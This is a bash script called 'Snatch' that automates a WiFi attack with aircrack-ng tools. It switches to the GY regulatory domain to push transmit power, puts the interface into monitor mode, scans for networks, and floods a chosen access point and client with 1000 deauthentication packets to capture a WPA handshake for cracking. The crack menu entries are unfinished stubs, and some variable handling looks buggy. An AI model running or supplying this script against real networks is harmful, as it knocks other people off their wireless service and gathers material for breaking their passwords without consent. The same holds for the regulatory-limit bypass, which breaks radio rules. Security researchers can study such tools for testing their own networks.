#!/bin/bash

# Title: Snatch wifi pentesting
# Version: 1.0
# Contact: hwac121@protonmail.com

# URL: http://www.majikcat.com
# GitHub: 

# DESCRIPTION
# Just another WiFi script automation to snatch a handshake from a
# network AP somewhere and their client.

#=======================================================================
#                          FUNCTIONS
#=======================================================================

splash(){
	echo -e " "
	echo -e "  _____ ____    ____  ______   __  __ __" 
	sleep 0.15	
	echo -e " / ___/|    \  /    ||      | /  ]|  |  |"
	sleep 0.15	
	echo -e "(   \_ |  _  ||  o  ||      |/  / |  |  |"
	sleep 0.15	
	echo -e " \__  ||  |  ||     ||_|  |_/  /  |  _  |"
	sleep 0.15	
	echo -e " /  \ ||  |  ||  _  |  |  |/   \_ |  |  |"
	sleep 0.15
	echo -e " \    ||  |  ||  |  |  |  |\     ||  |  |"
	sleep 0.15
	echo -e "  \___||__|__||__|__|  |__| \____||__|__|"  
	sleep 0.15
	echo -e "==============================================================="                                           
	echo -e "Version 1.0 - Created June 2019"
	echo -e " "
	echo -e "Please Note: You will need to either [Scan for Target] or [Set WiFi Interface] to begin."
	echo -e " "
}

credits(){
	echo -e " "
	echo -e "			███████▓█████▓▓╬╬╬╬╬╬╬╬▓███▓╬╬╬╬╬╬╬▓╬╬▓█" 
	sleep 0.15
	echo -e "			████▓▓▓▓╬╬▓█████╬╬╬╬╬╬███▓╬╬╬╬╬╬╬╬╬╬╬╬╬█"
	sleep 0.15
	echo -e "			███▓▓▓▓╬╬╬╬╬╬▓██╬╬╬╬╬╬▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█" 
	sleep 0.15
	echo -e "			████▓▓▓╬╬╬╬╬╬╬▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█" 
	sleep 0.15
	echo -e "			███▓█▓███████▓▓███▓╬╬╬╬╬╬▓███████▓╬╬╬╬▓█" 
	sleep 0.15
	echo -e "			████████████████▓█▓╬╬╬╬╬▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬█" 
	sleep 0.15
	echo -e "			███▓▓▓▓▓▓▓╬╬▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█" 
	sleep 0.15
	echo -e "			████▓▓▓╬╬╬╬▓▓▓▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█" 
	sleep 0.15
	echo -e "			███▓█▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█" 
	sleep 0.15
	echo -e "			█████▓▓▓▓▓▓▓▓█▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█" 
	sleep 0.15
	echo -e "			█████▓▓▓▓▓▓▓██▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██" 
	sleep 0.15
	echo -e "			█████▓▓▓▓▓████▓▓▓█▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██" 
	sleep 0.15
	echo -e "			████▓█▓▓▓▓██▓▓▓▓██╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬██" 
	sleep 0.15
	echo -e "			████▓▓███▓▓▓▓▓▓▓██▓╬╬╬╬╬╬╬╬╬╬╬╬█▓╬▓╬╬▓██" 
	sleep 0.15
	echo -e "			█████▓███▓▓▓▓▓▓▓▓████▓▓╬╬╬╬╬╬╬█▓╬╬╬╬╬▓██" 
	sleep 0.15
	echo -e "			█████▓▓█▓███▓▓▓████╬▓█▓▓╬╬╬▓▓█▓╬╬╬╬╬╬███" 
	sleep 0.15
	echo -e "			██████▓██▓███████▓╬╬╬▓▓╬▓▓██▓╬╬╬╬╬╬╬▓███" 
	sleep 0.15
	echo -e "			███████▓██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬████" 
	sleep 0.15
	echo -e "			███████▓▓██▓▓▓▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓████" 
	sleep 0.15
	echo -e "			████████▓▓▓█████▓▓╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬▓█████" 
	sleep 0.15
	echo -e "			█████████▓▓▓█▓▓▓▓▓███▓╬╬╬╬╬╬╬╬╬╬╬▓██████" 
	sleep 0.15
	echo -e "			██████████▓▓▓█▓▓▓╬▓██╬╬╬╬╬╬╬╬╬╬╬▓███████" 
	sleep 0.15
	echo -e "			███████████▓▓█▓▓▓▓███▓╬╬╬╬╬╬╬╬╬▓████████" 
	sleep 0.15
	echo -e "			██████████████▓▓▓███▓▓╬╬╬╬╬╬╬╬██████████" 
	sleep 0.15
	echo -e "			███████████████▓▓▓██▓▓╬╬╬╬╬╬▓███████████"
	sleep 0.15
	echo -e " "
	echo -e "Created June 2019"
	sleep 0.15
	echo -e " "
	echo -e "Web URL: http://www.majikcat.com"
	sleep 0.15
	echo -e "GitHub: https://github.com/hwac121"
	sleep 0.15
	echo -e "eMail: hwac121@protonmail.com"
	sleep 0.15
	echo -e "Donatations accepted via paypal - using email rjlemail@gmail.com"
	sleep 3.0
	echo -e " "
}

StartMonitor() {
		airmon-ng check kill
		sleep 0.25
		airmon-ng start wlan1 10
        sleep 0.25
}

StopMonitor(){
		echo -e "Taking $lanon out of monitor MODE"
		ifconfig $wlan down
		sleep 0.15
		iwconfig $wlan mode monitor
		sleep 0.15
		ifconfig $lanmon up
		sleep 0.15
		airmon-ng stop $lanmon
}

BoostInterface(){
	echo -e "Boosting $wlan now..."
	sleep 1.5
	ifconfig $wlan down
	sleep 3
	iw reg set GY
	sleep 3
	iwconfig $wlan txpower 30
	sleep 2
	ifconfig $wlan up
	sleep 1.5
}

#=======================================================================
#                        CHECK FOR ROOT
#=======================================================================

if [ "$EUID" -ne 0 ]
  then 
	clear
	splash
	echo "Please run as root or sudo ./snatch or sudo ress"
	sleep 0.5
  exit
fi

#=======================================================================
#                         BEGIN MENU
#=======================================================================

options=( "Scan for Target" "Attack Target" "View WiFi Interfaces" "View TX Power" "Set/Reset WiFi Interface" "Reset Network Manager" "Stop monitor MODE" "Crack with Special Character Set" "Crack with aircrack-ng" "Credits" "Help" "Quit")
PS3='Choose something here: '
while [ "$menu" != 1 ]; do
	clear
	splash
	echo -e " "
	sleep 0.25
	select opt in "${options[@]}"; do
    	case $opt in 
    	
#=======================================================================
#                        SCAN FOR TARGET
#=======================================================================

		"Scan for Target")
			clear
			splash
			echo -e "Choose which wifi interface to use: (ie. wlan0)"
			read wlan
			setmon="mon"
			lanmon="$wlan$setmon"
			BoostInterface
			echo -e "Setting interface to monitor mode"
			StartMonitor
			sleep 5.0
			echo -e "Starting local area scan now..."
			sleep 0.05
			echo -e "Once you have chosen a Target"
			echo -e "Close the small popup terminal to continue"
			echo -e "Be sure to copy down the bssid, essid, channel and station of the intended Target"
			xterm -hold -e airodump-ng $lanmon 2>&1 | tee terminal.log
			sleep 3 
			clear
		break
		;;

#=======================================================================
#                           ATTACK TARGET
#=======================================================================

		"Attack Target")
			clear
			splash
			echo -e "Enter the target's essid"
			read tessid
			echo -e " "
			echo -e "Enter target's bssid"
			read tbssid
			echo -e "Please enter target's station"
			read tstation
			echo -e "Please enter target's channel"
			read chan
			xterm -hold -e airodump-ng -w $tessid -c $chan --bssid $tbssid $lanmon && xterm -hold -e aireplay-ng --deauth 1000 -a $tbssid $tstation
			echo -e "When you see a handshake appear Ctrl+c and close the terminal popup window."
			echo -e "A *.cap file will be saved in the snatch folder."
		break
		;;

#=======================================================================
#                        VIEW WIFI INTERFACES
#=======================================================================

		"View WiFi Interfaces")
			clear
			splash
			echo -e " "
			echo -e "When you are done close the popup terminal to continue."
			xterm -hold -e airmon-ng
		break
		;;

#=======================================================================
#                        VIEW TX POWER & MORE
#=======================================================================

		"View TX Power")
			clear
			splash
			echo -e " "
			echo -e "When you are done close the popup terminal to continue."
			xterm -hold -e ifconfig
		break
		;;

#=======================================================================
#    CRACK WITH YOUR CHOSEN CHARACTER SET USING CRUNCH & AIRCRACK-NG
#=======================================================================
		
		"Crack with Special Character Set")
			clear
			splash
			echo -e "Not yet working..."
#			xterm -hold -e "SOMETHING GOES HERE"
			sleep 1.5
		break
		;;

#=======================================================================
#                   RESET WIFI CHOSEN INTERFACE
#=======================================================================
		
		"Set/Reset WiFi Interface")
			echo -e "Choose a WiFi Interface"
			read wlan
			setmon="mon"
			lanmon="$wlan$setmon"
		break
		;;

#=======================================================================
#                  ATTEMPT TO RESET NETWORK MANAGER
#=======================================================================

		"Reset Network Manager")
			clear
			splash
			echo -e "Attempting to restart the Network Manager..."
			service network-manager restart
			sleep 3
		break
		;;

#=======================================================================
#                         STOP MONITOR MODE
#=======================================================================

		"Stop monitor MODE")
			clear
			splash
			StopMonitor
			sleep 1.5
		break
		;;

#=======================================================================
#                         CRACK WITH AIRCRACK-NG
#=======================================================================

		"Crack with aircrack-ng")
			clear
			splash
			echo -e "Not yet working..."
#			xterm -hold -e "aircrack-ng -w ENTER-DICTIONARY-HERE -b $bssid CAP-FILE-GOES-HERE"
			sleep 1.5
		break
		;;

#=======================================================================
#                               CREDITS
#=======================================================================

		"Credits")
			clear
			splash
			echo -e " "
			credits
			sleep 2
		break
		;;

#=======================================================================
#                                HELP
#=======================================================================
		"Help")
			clear
			echo -e "something goes here"
			sleep 1.5
		break
		;;

#=======================================================================
#                                QUIT
#=======================================================================

		"Quit")
			clear
			echo -e " "
			echo -e "Thank you for using Snatch v1.0 - Created June 2019"
			menu=1
			sleep 2
			clear
		break
		;;
	* )
			echo -e "$REPLY is an invalid option"
		break
		;;
    	esac
	done
done

exit 0
